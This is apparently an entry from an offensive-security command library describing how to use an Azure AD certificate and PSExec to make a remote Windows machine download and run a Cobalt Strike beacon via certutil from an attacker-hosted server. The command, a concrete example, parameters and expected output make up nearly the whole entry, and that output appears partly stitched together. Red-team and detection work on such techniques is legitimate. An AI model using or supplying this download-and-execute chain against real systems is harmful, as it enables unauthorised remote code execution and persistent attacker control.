---
id: 82781298-d670-49da-bd09-c302a9141527
name: download-and-execute-cobalt-strike-beacon-via-azure-cert-psexec
type: command
executor: bash
data: >-
  python Main.py --usercert $_USERNAME@$_TENANT_NAME.onmicrosoft.com.pfx
  --certpass AzureADCert --remoteip $_TARGET_IP --command "certutil.exe
  -urlcache -split -f http://$_ATTACKER_IP:$_ATTACKER_PORT/beacon.exe
  C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
output: |-
  Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

  Type help for list of commands

  # Successful PSExec connection and command execution
created_at: '2023-05-25T18:50:44.626890+00:00'
updated_at: '2023-05-25T18:50:44.779119+00:00'
platforms:
  - Windows
tags:
  - psexec
  - rce
  - cobalt-strike
  - certutil
verified: true
validated: true
---

# download-and-execute-cobalt-strike-beacon-via-azure-cert-psexec

## Command

```bash
python Main.py --usercert $_USERNAME@$_TENANT_NAME.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $_TARGET_IP --command "certutil.exe -urlcache -split -f http://$_ATTACKER_IP:$_ATTACKER_PORT/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
```

## Description

This command authenticates to a remote Azure AD-joined Windows machine using a PFX certificate and executes a PSExec payload to download and run a Cobalt Strike beacon, establishing a C2 connection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --usercert $_USERNAME@$_TENANT_NAME.onmicrosoft.com.pfx | Path to the PFX certificate file | Yes |
| --certpass AzureADCert | Password for the PFX (default: AzureADCert) | Yes |
| --remoteip $_TARGET_IP | IP address of the target machine | Yes |
| --command | The remote command to execute (certutil download and exec) | Yes |

## Examples

### Basic Usage

```bash
python Main.py --usercert Gadmin@ResearchAadLabEnv.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.10.10.10 --command "certutil.exe -urlcache -split -f http://192.168.1.100:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
```

### Advanced Usage

Escape quotes properly for complex commands; ensure HTTP server is hosting the beacon.

## Expected Output

The tool connects via SMB/PSExec and executes the command, outputting:

```
Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.10.....
[*] Found writable share ADMIN$\n[*] Uploading file...
[*] Opening SVCManager on 10.10.10.10...
[*] Creating service CobaltStrike on 10.10.10.10...
Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

Type help for list of commands

# Beacon downloaded and executed successfully
```

Look for beacon connection on the attacker's listener.

## Related

- [[procedures/azure-pass-the-certificate-ad-cert-request-and-rce]]
- [[tools/azure-ad-joined-machine-ptc]]
